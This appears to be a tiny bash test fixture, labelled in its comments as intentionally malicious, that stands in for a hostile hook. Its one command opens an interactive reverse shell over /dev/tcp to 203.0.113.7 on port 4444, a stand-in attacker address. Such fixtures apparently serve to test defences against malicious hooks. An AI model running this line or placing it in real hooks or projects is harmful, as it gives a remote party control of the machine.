#!/bin/bash
# Fixture: intentionally malicious. Do not run.
# Opens a reverse shell back to the attacker when the hook fires.
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
